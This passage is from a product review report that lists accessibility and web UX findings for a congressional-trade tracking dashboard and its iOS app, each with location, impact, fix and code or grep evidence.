- **Fix:** On desktop render headers as <h2>/<h3> (or set summary tabindex=-1 above 769px) and move the #/$ controls and ⓘ outside <summary>.
- **Evidence:** dashboardHtml.ts@origin/main:2205 `#view-trends details.trends-fold > summary { cursor: default; pointer-events: none; }` (inside the ≥769px media block); :12456 forceTrendsFoldOpenAtDesktop() only on load/resize; #/$ seg buttons and ⓘ tips sit inside <summary> (:2919-2922, :2964-2967, :2995); logs/desktop-trends-console.txt:6 `[issue] Interactive element inside of a <summary> element (count: 5)`; trends-a11y.txt:105-107 `DisclosureTriangle "What Is Being Traded Rank by trade count or volume"` containing `button "#"`.
- **Panel:** web-a11y — CSS, console issue and a11y tree all reproduce; live DOM check confirmed summary tabIndex=0. · `web-a11y/WEBA11Y-24`

#### 292. [P3] role=menu overflow menu and account menu lack menu keyboard semantics (arrow keys, Escape, aria-expanded)

- **Where:** app/src/ui/dashboardHtml.ts:2782-2783 (menu), 12675 (Escape handler)  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 4.1.2 / ARIA APG: role=menu implies arrow-key navigation, focus moved into the menu and Escape to close; none is implemented; account menu exposes no expanded state.
- **Impact:** Screen-reader users hear 'menu' and expect arrow navigation that doesn't work; keyboard users can't dismiss the menus with Escape.
- **Fix:** Either drop role=menu/menuitem (plain buttons in a disclosure) or implement APG menu keyboard handling; add aria-expanded/aria-controls to #acctMenuBtn and close both on Escape with focus return.
- **Evidence:** dashboardHtml.ts@origin/main:2807-2810 `<button … aria-haspopup="true" aria-expanded="false">⋯</button><div class="menu-pop feed-options-menu" … role="menu"><button … role="menuitem">Columns</button>…`; :11951-11960 toggleFeedOptions only toggles class/aria-expanded; grep ArrowDown/ArrowUp → 0; :12675 Escape handler `closePanels(); closeDrawer(); closeLogin(); closePricing();` does not call closeFeedOptions/closeAcctMenu; :11623 `'<button class="acct-menu-btn" id="acctMenuBtn" title="Account menu" onclick="toggleAcctMenu()">'` (:11663 toggles class only) has no aria-expanded/aria-haspopup/aria-controls (signed-in only, code review).
- **Panel:** web-a11y — All citations verified; no arrow-key handling anywhere in the file. · `web-a11y/WEBA11Y-25`

#### 293. [P3] Columns and Export CSV <dialog>s have no accessible name

- **Where:** app/src/ui/dashboardHtml.ts:2782, 12854  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 4.1.2 / 2.4.6: modal dialogs announced without a name.
- **Impact:** AT users don't know which dialog opened.
- **Fix:** Add aria-labelledby pointing at the .panel-title (give it an id) and make the title an <h2>.
- **Evidence:** dashboardHtml.ts@origin/main:2782-2783 `<dialog class="search-panel" id="colChooser" …><div class="panel-head"><span class="panel-title">Columns</span>…`; :12854 `<dialog class="search-panel" id="exportCsvDialog" …>` — no aria-labelledby/aria-label, title is a plain span.
- **Panel:** web-a11y — Markup quoted; grep aria-labelledby shows it is used only on tabpanels. · `web-a11y/WEBA11Y-26`

#### 294. [P3] Trades search input has only a (truncated) placeholder as visible label

- **Where:** app/src/ui/dashboardHtml.ts:2775  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 3.3.2 Labels or Instructions: no persistent visible label; the placeholder is cut off mid-word and disappears on input.  (Programmatic name is fine.)
- **Impact:** Sighted users see a clipped hint and lose it while typing.
- **Fix:** Add a visible label or search icon + shorter placeholder that fits ('Search trades…'), or widen the field; keep aria-label.
- **Evidence:** dashboardHtml.ts@origin/main:2775 `<input id="qSearch" class="icon-input" placeholder="Search name, ticker, state, party…" aria-label="Search trades by politician, asset, state, or party" …>`; dark/d-trades.png shows the placeholder clipped to 'Search name, ticker, sta'; NOTES.md:367-368 confirms the hard truncation in every desktop capture.
- **Panel:** web-a11y — Screenshot d-trades.png shows 'Search name, ticker, sta'. · `web-a11y/WEBA11Y-27`

#### 295. [P3] No skip link; keyboard users tab through brand/tabs/account/filters before content

- **Where:** app/src/ui/dashboardHtml.ts (no skip-link found); header ~2691-2705  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-5)
- **What:** WCAG 2.4.1 Bypass Blocks is technically met by landmarks, but there is no keyboard bypass; every view repeats a 6-8 control filter toolbar before content.
- **Impact:** Keyboard users make ~10 extra Tab presses per view to reach results.
- **Fix:** Add a visually-hidden-until-focus <a href="#main" class="skip-link">Skip to content</a> as first child of <body> and id="main" tabindex="-1" on <main>.
- **Evidence:** Live curl of https://congress.trade/?view=trades: grep -i 'skip[- ]to' → 0; dashboardHtml.ts@origin/main:2691-2705 header starts directly with brand + tablist + #acct; <main> landmark at :2705; grep 'skip-link' → 0.  Prior: docs/reviews/2026-08-10-web-ui-expert-review.md:173 'P2-5 — No skip link / main landmark focus'.
- **Panel:** web-a11y — Live HTML and source both lack a skip link; prior review P2-5 quoted at line 173. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-08 · `web-a11y/WEBA11Y-28`

#### 296. [P3] Trade drawer heading is the amount bracket only ('$1k - $15k'), not a descriptive title

- **Where:** app/src/ui/dashboardHtml.ts:11384  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 2.4.6 Headings and Labels: the only h2 in the drawer does not describe the trade (who/what/side).
- **Impact:** Screen-reader users jumping by heading land on '$1k - $15k' with no context.
- **Fix:** Make the h2 'Sold $1k–$15k of VSNT — Kevin Hern' (or aria-labelledby kicker + headline + identity), and use it as the dialog name (see WEBA11Y-07).
- **Evidence:** dashboardHtml.ts@origin/main:11384 `'<h2 class="drawer-trade-headline">' + esc(amountText(row.min, row.max)) + '</h2>'`; desktop/trades-row-expanded-a11y.txt:131 `heading "$1k - $15k" level="2"` while 'SOLD' is a separate StaticText (:130) and the topbar summary is aria-hidden (:3423 `id="drawerTopbarTitle" aria-hidden="true"`).
- **Panel:** web-a11y — Code and a11y tree match. · `web-a11y/WEBA11Y-29`

#### 350. [P3] Directory search fields: container label lands on the decorative magnifier icon; magnifier icons never hidden

- **Where:** clients/ios/CongressTrade/MemberDirectorySearch.swift:472-499 (AssetSearchField), 293-294 (call site with container label)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The magnifying-glass `Image` becomes a focusable element announcing the search-field label, immediately followed by the TextField announcing it again; the placeholder text ('Name, state, party… e.g.  CA Ro') is lost as the label overrides it.
- **Impact:** Duplicate announcements and lost placeholder guidance for VoiceOver users on every search box.
- **Fix:** Move `.accessibilityLabel` onto the `TextField` and mark the magnifier `.accessibilityHidden(true)`.
- **Evidence:** PeopleDirectoryView.swift:105-106 `PeopleSearchField(…).accessibilityLabel("Search directory by name, state, or party")` applied to an `HStack` (:289-317) containing `Image(systemName: "magnifyingglass")`, `TextField("Name, state, party… e.g. CA Ro", …)`, and a Clear button (which has its own label at :309); MemberDirectorySearch.swift:293-294 same for `AssetSearchField`; FeedDashboardView.swift:1086,:1159 magnifier images with no `.accessibilityHidden(true)`.
- **Panel:** ios-a11y — Same container-label pattern as IOSA11Y-02 (kept separate: different screens, lower impact — no hidden action here). · `ios-a11y/IOSA11Y-18`

#### 351. [P3] Secondary caption text on grey cards measures ~3.3:1 (below AA for 11-12pt captions)

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift and Views/Feed/FeedDashboardView.swift (widespread)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** `.secondary` (secondaryLabel) is ~3.4:1 on white and drops to ~3.3:1 on `secondarySystemBackground` cards and ~2.8:1 on `.ultraThinMaterial`; the app uses it for 11pt captions carrying data (company name, est. volume, date, politician).
- **Impact:** Low-vision users struggle with most secondary data in light mode.
- **Fix:** For data-bearing captions use `Color(uiColor: .label).opacity(0.7)` (≈5:1) or step up to `.footnote`; keep `.secondary` only for truly auxiliary text; avoid secondary caption text on `.ultraThinMaterial`.
- **Evidence:** Verifier re-measured: light/20-trends-top-loaded.png secondary grey (133,133,139) on card (242,242,247) = 3.29:1; light/10-trades-tab.png politician line on the card material ≈ (147,147,147) on (244,244,244) = 2.79:1.  Code: `.foregroundStyle(.secondary)` on `.caption2`/`.caption` text at TrendsView.swift:299-301,:309-311,:370-372,:594-595; FeedDashboardView.swift:1399-1401,:1446-1449,:866-868.
- **Panel:** ios-a11y — Both measurements reproduced within 0.1 of the raw values.  Note this is Apple's own system colour, so P3 is appropriate. · `ios-a11y/IOSA11Y-19`

#### 359. [P3] Light-theme direction pills in Consensus cards and Trends tables fall below 4.5:1 (10 px bold)

- **Where:** app/src/ui/dashboardHtml.ts:1090  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** WCAG 1.4.3: 10 px text needs 4.5:1; the tinted backgrounds pull the ratio under threshold.
- **Impact:** Low-vision users struggle to read BOUGHT/SOLD on cluster cards.
- **Fix:** Reduce tint to ~8% or use darker text tokens (#b91c1c / #166534) for the pill text; bump font to 11px.
- **Evidence:** dashboardHtml.ts@origin/main:1090-1092 `.dirpill { font-size:10px; font-weight:700; … } .dirpill.B, .dirpill.P { color: var(--buy); background: color-mix(in srgb, var(--buy) 16%, transparent); } .dirpill.S { color: var(--sell); background: color-mix(in srgb, var(--sell) 16%, transparent); }`; recomputed light: #dc2626 on 16% red-tinted white = 3.75:1, #15803d on 16% green tint = 4.05:1; dark sell #ef4444 on tinted #121b30 = 3.91:1 (dark buy passes at 5.71).
- **Panel:** web-a11y — Ratios recomputed and match (assuming the pill sits on the white panel; over other surfaces the numbers vary slightly). · `web-a11y/WEBA11Y-22`

#### 360. [P3] Text inputs/selects have ~1.6:1 borders on white and no other boundary cue

- **Where:** app/src/ui/dashboardHtml.ts:156,197 (tokens)  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** WCAG 1.4.11 Non-text Contrast: the visual boundary of form fields is below 3:1 against adjacent colours; only placeholder text hints at the field.
- **Impact:** Low-vision users may not perceive where the search/target-URL fields are, especially once placeholder text is gone.
- **Fix:** Use a ≥3:1 border for inputs/selects (e.g. #8a9bb8 light / #566d9c dark) or a filled background that contrasts ≥3:1 with the surrounding surface.
- **Evidence:** dashboardHtml.ts@origin/main:375-378 `input, select { background: var(--panel); color: var(--text); border: 1px solid var(--border); … }`; :197 light `--border: #c1cde2` → on #ffffff = 1.60:1, on page bg #eff3f8 = 1.44:1; dark :156 `--border: #2e3e65` on #121b30 = 1.63:1.
- **Panel:** web-a11y — Tokens and ratios reproduced (1.60 / 1.44 / 1.63).  1.4.11 allows fields identifiable by other cues, so kept at P3. · `web-a11y/WEBA11Y-23`

#### 375. [P3] minimumScaleFactor and fixed widths shrink/clip values at large text sizes

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:1051; clients/ios/CongressTrade/Views/Components/Components.swift:182  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2, line 97)
- **What:** When the user enlarges text the app shrinks the numbers back down (up to 30%) or truncates them inside fixed-width frames, defeating the setting where the data matters most.
- **Impact:** Large-text users see smaller-than-body numbers and '…' in the Trends cards.
- **Fix:** Remove `minimumScaleFactor`, let tiles wrap (`.fixedSize(horizontal:false, vertical:true)`), replace fixed widths with `@ScaledMetric` or grid columns, and stack label/value vertically at accessibility sizes.
- **Evidence:** TrendsView.swift:1054-1055 `TrendKPI` value `.lineLimit(1).minimumScaleFactor(0.7)`; Components.swift:139-140 `MetricTile` `.lineLimit(1).minimumScaleFactor(0.75)`; TrendsView.swift:237 period label `.frame(width: 72, alignment: .leading)`; :258 `.frame(width: useDollars ? 64 : 50…)` with `.minimumScaleFactor(0.75)`; :510 `.frame(maxWidth: 92…)`, :516 `.frame(minWidth: 68…)`, :522 `.frame(width: 104…)` on market-cap rows; :216,:285 `Picker … .frame(maxWidth: 88)`; FeedDashboardView.swift:1397-1398 amount `.minimumScaleFactor(0.8)`.
- **Panel:** ios-a11y — All cited modifiers present at the stated lines; AX-size behaviour itself not captured (only XXXL), so impact is inferred. · `ios-a11y/IOSA11Y-12`

#### 400. [P4] Ungrouped/unlabelled Trends rows: By Market Cap, Committee Conflicts, provider scorecards; abbreviated units

- **Where:** Trends → By Market Cap, Committee Sector Conflicts, Speed vs. Data Providers, Slowest Filers  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** VoiceOver reads three or four fragments per row and speaks 'plus twenty-four point one h', 'twelve d avg'.
- **Impact:** Slower comprehension for screen-reader users in the lower Trends sections.
- **Fix:** Combine each row and supply labels with spelled-out units ('24.1 hours ahead', '12 days average delay').
- **Evidence:** TrendsView.swift:504-523 market-cap row `HStack { Text(cap.bucket.capitalized); Text("\(cap.tradeCount) trades"); Text(SignedFlowFormat.usd(…)) }` — no `.accessibilityElement(children: .combine)` (sector rows at :485 do have it); :680-710 conflicts buttons have no `.accessibilityLabel/Hint` unlike siblings (:612-617,:659-660); :1196-1250 `ProviderScorecard` ungrouped, headline `formatLead` yields '+24.1h' / '−13m' (:1109-1117); :772 `"\(…)d avg"`.
- **Panel:** ios-a11y — Code quoted. · `ios-a11y/IOSA11Y-26`

#### 401. [P4] Vague/instructional accessibility labels: 'Menu', '1 of 44', 'tap to reverse' inside labels

- **Where:** Header hamburger, pagination bars, sort direction chips  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Labels should name the control; hints describe the result.  VoiceOver appends 'double-tap to activate' anyway and 'tap' is wrong for VoiceOver.
- **Impact:** Minor confusion for VoiceOver users.
- **Fix:** 'Account menu'; 'Page 1 of 44'; label 'Sort descending' + hint 'Reverses sort order'.
- **Evidence:** Components.swift:783 `.accessibilityLabel("Menu")` (opens the Account sheet); FeedDashboardView.swift:866-870 `Text(pageLabel)…accessibilityLabel(pageLabel)` → '1 of 44'; :749 `.accessibilityLabel(sortAscending ? "Ascending, tap to reverse" : "Descending, tap to reverse")` and :798 `"\(store.feedSortDirection.accessibilityLabel), tap to reverse"` — action instructions belong in `.accessibilityHint`.
- **Panel:** ios-a11y — Code quoted. · `ios-a11y/IOSA11Y-28`

#### 402. [P4] No accessibility announcements for asynchronous state changes (updating, purchase result, copied, sign-in notice)

- **Where:** Trades search 'Updating results…', PremiumSheet notices, DeliveryCredentialView Copy button, SignInPanel notice  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** VoiceOver users are not told when a search finished, a purchase succeeded/failed, or a secret was copied unless they re-scan the screen.
- **Impact:** Confusion after money-path and copy actions for blind users.
- **Fix:** Post `AccessibilityNotification.Announcement("…").post()` (iOS 17) when these notices change, and move focus (`@AccessibilityFocusState`) to error text in PremiumSheet.
- **Evidence:** Verifier grep for `UIAccessibility|AccessibilityNotification|accessibilityFocus` across clients/ios/CongressTrade returns nothing (only `accessibilityReduceMotion` in the unused EagleSplashView).  State is visual only: FeedDashboardView.swift:1115-1123 spinner + 'Updating results…'; PremiumSheet.swift:295-306 `notice = "Purchase confirmed.  Unlocking Premium…"` etc.; DeliveryView.swift:549-558 label flips to 'Copied'; Components.swift:1073-1080 `store.watchlistNotice` text.
- **Panel:** ios-a11y — Grep reproduced (zero announcement APIs). · `ios-a11y/IOSA11Y-29`

#### 425. [P4] Localization readiness: no strings catalog, hard-coded plurals, non-locale date patterns, hand-rolled currency

- **Where:** Whole app  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'localized strings and locale-safe date/number/currency formatting', line 99)
- **What:** Everything is English/US-only; the code shape (interpolated strings, ad-hoc plurals, fixed dateFormat) will need a rewrite rather than translation when localization is attempted.
- **Impact:** Blocks future localization and gives non-US-locale users unlocalized dates/numbers today.
- **Fix:** Add a String Catalog, use `String(localized:)`/`^[\(n) trade](inflect: true)` for plurals, `Date.FormatStyle` or `setLocalizedDateFormatFromTemplate`, and `FormatStyle.currency(code:"USD")` with `.notation(.compactName)`.
- **Evidence:** Verifier: `find clients/ios -name '*.xcstrings' -o -name '*.strings' -o -name '*.lproj'` → none; pbxproj `knownRegions = (en, Base)`; `String(localized:` = 0 uses.  Hard-coded plurals: TrendsView.swift:428 `\(c.memberCount == 1 ? "politician" : "politicians")`, :512, :800 `whole == 1 ? "day" : "days"`, :1005; split nouns :648-652 `Text("\(m.tradeCount ?? 0)")` + `Text("trades")`.  Fixed date patterns: TrendsView.swift:816,:827,:840 `fmt.dateFormat = "MMM d"` / `"MMM yyyy"` (new `DateFormatter()` per row per render); TradeDetailView.swift:353 `String(format: "$%.2f → $%.2f%@")`; TickerDetailView.swift:50 `String(format: "$%.2f")`; Components.swift:255-274 hand-built `"$\(…)k"`; TrendsView.swift:886 `String(format: "%+.1f%%")`.
- **Panel:** ios-a11y — All greps reproduced. · `ios-a11y/IOSA11Y-24`

#### 437. [P4] Decorative images not hidden / unlabeled: Premium benefit icons and hero logos read as 'image'

- **Where:** Premium sheet, Trade Details hero, Ticker sheet hero  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** VoiceOver reads the symbol names before each benefit and 'image' at the top of the sheets, adding noise without meaning.
- **Impact:** Minor VoiceOver clutter.
- **Fix:** `.accessibilityHidden(true)` on the benefit icons; in `AssetMark` add `.accessibilityLabel("\(symbol) logo")` or hide it when a sibling text already names the ticker.
- **Evidence:** PremiumSheet.swift:70-74 `Image(systemName: benefit.systemImage).font(.subheadline)…frame(width: 22…)` beside each benefit with no `.accessibilityHidden(true)`; TradeDetailView.swift:20-25 `AssetMark(symbol:…).scaleEffect(1.3)` and TickerDetailView.swift:32 `AssetMark(symbol: ticker…)` — `AssetMark` (Components.swift:222-249) yields a raw `AsyncImage` `Image` with no label or hidden flag (unlike `MemberAvatar`, hidden at Components.swift:124).
- **Panel:** ios-a11y — Code quoted; exact VoiceOver output not runnable but SwiftUI Images without labels are focusable. · `ios-a11y/IOSA11Y-25`

#### 438. [P4] Active filter chip: white 12pt text on system blue is 4.0:1

- **Where:** Filter chips when a non-default filter is applied  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Borderline AA failure on active chip labels.
- **Impact:** Slightly reduced legibility of applied filters for low-vision users.
- **Fix:** Use a slightly darker accent for chip fills (e.g. #0A5FD1) or bold 13pt+ text.
- **Evidence:** FeedDashboardView.swift:702-706 `.foregroundStyle(isActive ? .white : .primary).background(isActive ? Color.blue : …)` with `.font(.caption.weight(.semibold))` (:1026); verifier computed white on #007AFF = 4.02:1 (< 4.5:1 for 12pt text).
- **Panel:** ios-a11y — Ratio reproduced arithmetically; no active-chip screenshot exists, so treated as computed rather than measured. · `ios-a11y/IOSA11Y-27`

#### 447. [P4] Windows High Contrast / forced-colors: box-shadow-based focus rings and party rings disappear

- **Where:** Trends focus styles, avatar party rings, filter chips  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** In forced-colors mode the custom focus indicators and colour rings vanish, leaving no focus indication on Trends (2.4.7) and no party cue.
- **Impact:** Windows High Contrast users lose focus visibility on Trends and party indication everywhere.
- **Fix:** Add @media (forced-colors: active) { :focus-visible { outline: 2px solid Highlight; outline-offset:2px } .avatar.party-* { border: 2px solid CanvasText } } and prefer outline for focus (see WEBA11Y-11).
- **Evidence:** dashboardHtml.ts@origin/main: grep 'forced-colors' → 0; focus rings implemented as box-shadow (:2545-2549, :2536-2538) and party rings as box-shadow (:513-515); forced-colors mode drops box-shadow and background-color.
- **Panel:** web-a11y — grep reproduced (0 forced-colors); the cited box-shadow rules exist.  Not rendered in HCM, so impact is inferred from platform behaviour. · `web-a11y/WEBA11Y-32`

#### 457. [P4] Tab bar uses replaceState and no arrow-key navigation; no automated a11y gate in CI

- **Where:** Primary tablist; CI  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** tracked-in-PR-#1979 (BS-A2, report-only)
- **What:** ARIA tabs pattern expects arrow-key movement between tabs; and there is no regression gate so the aria-sort/nested-button regressions above ship silently.
- **Impact:** Minor keyboard ergonomics; ongoing risk of a11y regressions in a 12.9k-line template string.
- **Fix:** Add ArrowLeft/Right/Home/End on the tablist, consider pushState per view; add an axe-core smoke on /?view=trends, trades, people, subs failing CI on serious/critical.
- **Evidence:** dashboardHtml.ts@origin/main:12068-12071 tab click handler `window.history.replaceState({}, '', …)`; grep 'ArrowLeft' / 'ArrowRight' → 0; .github/workflows/ (ci.yml, security.yml, ios-build.yml, …) contains no axe/Playwright a11y job (grep axe|a11y|accessib → none); PR #1979 BS-A2 'No automated a11y gate' documents the same gap.
- **Panel:** web-a11y — All greps reproduced; PR #1979 BS-A2 confirmed via gh pr diff.  Two loosely related items in one finding, kept as P4 idea. · `web-a11y/WEBA11Y-34`

#### 467. [P4] Fixed heights and nowrap/ellipsis on small labels risk clipping under WCAG text-spacing / large fonts

- **Where:** Mobile tab-bar labels, filter chips, chart x-axis labels  ·  **Surface:** Web · mobile  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** plausible (low confidence)
- **What:** WCAG 1.4.12 / 1.4.4: fixed 12px-high, nowrap+ellipsis labels at 9-10px are likely to truncate or overlap under user text-spacing/font overrides.  Not verified in a browser.
- **Impact:** Users with browser minimum-font or text-spacing overrides may see truncated tab labels or clipped axis labels.
- **Fix:** Use min-height instead of height, allow wrapping on tab labels, raise the smallest sizes to ≥11px, and test with the WCAG text-spacing bookmarklet.
- **Evidence:** dashboardHtml.ts@origin/main:1875 `nav.tabs button::after { … font-size: 10px; line-height: 1.1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }`; :1029 `.tlbl { display:block; height:12px; line-height:12px; font-size:9px; … white-space:nowrap; }`; ios/NOTES §8 shows equivalent chip overflow at XXXL on iOS; web large-text was not captured.
- **Panel:** web-a11y — CSS citations verified; the clipping outcome is inferred, not reproduced (no large-text/text-spacing capture). · `web-a11y/WEBA11Y-33`

### Web UX: navigation, sharing, filtering and error states (58)

Back never works, drawers are unshareable, sorts and searches quietly apply to one page of 50, and failures after first load are swallowed.  Users cannot trust that what they see is what they asked for.

#### 11. [P1] 'Sign In with Apple' on the web is a dead button — it always redirects to ?auth_error=apple_web_not_configured

- **Where:** app/src/ui/dashboardHtml.ts:11711-11724  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** new
- **What:** The web sign-in modal offers exactly two options and one of them is guaranteed to fail on production; the user is bounced back to the home page and told to use Google.
- **Impact:** Every Apple-first visitor hits an error on the primary conversion path (sign-in is required for Premium); it also looks like an outage.
- **Fix:** Either finish the Apple web config (Services ID / key in secrets) or have the server tell the client whether Apple web is enabled (e.g. a boolean in `/auth/me` or a data attribute rendered into the shell) and hide the Apple button when it is not.  Add a test that the modal never renders an auth provider whose start route would 302 to auth_error.
- **Evidence:** curl -H 'Accept: text/html' https://congress.trade/auth/apple/start -> 302 to `/?auth_error=apple_web_not_configured` (reproduced 3x live, 2026-08-19; without an Accept:text/html header the same route returns 503 JSON, both paths consistent with app/src/auth/routes.ts:301-317 `const cfg = await loadAppleWebConfig(c.env); if (!cfg) { ...  return c.redirect('/?auth_error=apple_web_not_configured') } ... return c.json({error:'Sign in with Apple web is not configured'}, 503)`). Modal always renders the link: origin/main dashboardHtml.ts:3436 `<a class="abtn" id="appleSignInBtn" href="/auth/apple/start">` (byte-for-byte verified).
- **Panel:** qa-bughunt — Reproduced live 3 consecutive times with Accept:text/html header — always 302s to the exact auth_error param cited.  Code path confirmed in auth/routes.ts and the modal button href confirmed in dashboardHtml.ts:3436. · merged: web-ux-desktop/WEBUXDESKTOP-02, web-mobile/WEBMOBILE-01, growth-onboarding/GROWTHONBOARDING-01, app-store-compliance/APPSTORECOMPLIANCE-09, prior-review-followup/PRIORREVIEWFOLLOWUP-34, security-web/SECURITYWEB-02 · `qa-bughunt/QABUGHUNT-02`

#### 36. [P1] Trades column sort (Amount, Type, Politician, Asset, Country) only reorders the 50 loaded rows, while the header arrows imply a corpus sort

- **Where:** app/src/ui/dashboardHtml.ts:5074-5086  ·  **Surface:** Web · desktop  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Clicking Amount ▼ shows the biggest trades of the current page, not the biggest trades matching the filters; page 2 restarts the sort from a fresh date-ordered slice.  Nothing tells the user the sort is page-local, and the pager, count and header arrows all read as a global sort.
- **Impact:** Users asking "largest trades this quarter" or "all of Pelosi's rows first" get a silently wrong answer.
- **Fix:** Either extend the `/api/transactions` sort whitelist (rest.ts asTxSort + rows.ts ORDER BY) to amount/type/member/asset and send sort/order for every sortable key, or label non-backend sorts explicitly ("sorts this page") and disable them when total > page size.
- **Evidence:** dashboardHtml.ts@origin/main:5075-5088 setSort(): `var isBackendSort = (key === 'published' || key === 'imported' || key === 'txdate' || key === 'traded'); if (isBackendSort) { … fetchPage(); } else { renderTrades(); }`; :5281-5292 tradesQueryParams only maps published/tx_date to the API.  Server side, delivery/rest.ts@origin/main:412 `asTxSort` whitelists only `published | cursor | tx_date`, so no other column can be corpus-sorted today.  trades-a11y.txt uid=4_46/4_48 lists `button "POLITICIAN ↕"`, `"AMOUNT ↕"` as sortable while the pager reads "1-50 of 2,178 · Page 1 of 44".
- **Panel:** web-ux-desktop — Client code confirmed verbatim.  Corrected the recommendation: the original said the server 'already sorts' — it only supports published/cursor/tx_date, so a backend change is required for a true corpus sort. · merged: qa-bughunt/QABUGHUNT-05, ios-shipped-app/IOSSHIPPEDAPP-46 · `web-ux-desktop/WEBUXDESKTOP-04`

#### 37. [P1] Browser Back never works inside the app: tabs, filters and drawers all use replaceState and there is no popstate handler

- **Where:** app/src/ui/dashboardHtml.ts:5387-5405  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Every in-app navigation (Trends→Trades→Directory, opening a member/ticker/trade drawer, changing a filter) rewrites the current history entry instead of pushing one.  Pressing the browser Back button after any of these leaves congress.trade entirely (or returns to whatever site the visitor came from), and Back cannot close a drawer or undo a tab switch.  Alt+←, mouse back buttons and trackpad swipe-back all behave the same way.
- **Impact:** Core web navigation convention broken on every view; users who open a politician from Trends and press Back lose the site.  Also blocks deep-linkable drawer state (see 03).
- **Fix:** Push a history entry on tab switch and on drawer open (with `?view=`/`?trade=|member=|ticker=` in the URL), replaceState only for filter typing; add a `popstate` handler that re-applies view/filters and opens/closes the drawer from the URL.
- **Evidence:** dashboardHtml.ts@origin/main:12057-12071 tab click → `window.history.replaceState({}, '', u.pathname + u.search + u.hash)`; :5387-5404 syncFilterUrl → replaceState; :10824-10858 openDrawer/closeDrawer touch no history at all.  `grep -n "pushState\|popstate" dashboardHtml.ts` returns nothing; the only history calls are replaceState at 5404, 12003, 12071, 12786.  PR #1973 parity diff line 123: "no History push for entity drawers.  Tab switches history.replaceState".
- **Panel:** web-ux-desktop — Reproduced by grep on origin/main: 4 replaceState calls, zero pushState/popstate.  Tab handler and syncFilterUrl quoted at the cited lines. · merged: qa-bughunt/QABUGHUNT-09, web-mobile/WEBMOBILE-06 · `web-ux-desktop/WEBUXDESKTOP-01`

#### 48. [P1] Politician and ticker drawers dead-end at 10–15 "recent trades" with no route to the full list on the Trades tab

- **Where:** app/src/ui/dashboardHtml.ts:11163-11164 (ticker), 11267 (member)  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The primary task "find a politician and see their trades" ends in a drawer showing ~1% of the record with no pager, no sort and no "See all 961 trades" handoff to the Trades tab (which can filter by name/ticker via search but is not linked).  Same for a ticker.
- **Impact:** Users cannot complete the core research flow without knowing to retype the name into the Trades search box.
- **Fix:** Add "See all N trades →" (sets `fq`/member filter, switches to Trades) under Recent Trades in both drawers, and consider a paged mini-table.
- **Evidence:** Live 2026-08-19: `curl /api/analytics/member/house-ca17-ro-khanna?window=90d` → stats.totalTrades 961, recentTrades length 10; `curl /api/analytics/ticker/NVDA?window=all` → summary.totalTrades 633, recentTrades length 15.  dashboardHtml.ts@origin/main:11240-11253 renders `d.recentTrades` into a mini table and :11269 the only trailing action is `copyLinkHtml('member', filerId, …)`; openAsset does the same.  Code comment at :11421-11424 records that the former "View All Trades of X" / "by Y" links were removed ("only the share link stays here").  `grep -n "View all\|all trades\|See all" dashboardHtml.ts` → no user-facing hits.  desktop/politician-detail.png and ticker-drawer-bottom.png show the list ending at "Copy link".
- **Panel:** web-ux-desktop — Curls re-run today (961/10, 633/15).  Fixed the code-comment line reference (11421-11424, in openTrade). · `web-ux-desktop/WEBUXDESKTOP-05`

#### 102. [P2] Deep-link params (?ticker / ?member / ?trade / ?pricing / ?auth_error) are never removed on close and survive tab switches — refresh or share re-opens the drawer/modal, and a failed Apple sign-in re-opens the login modal forever

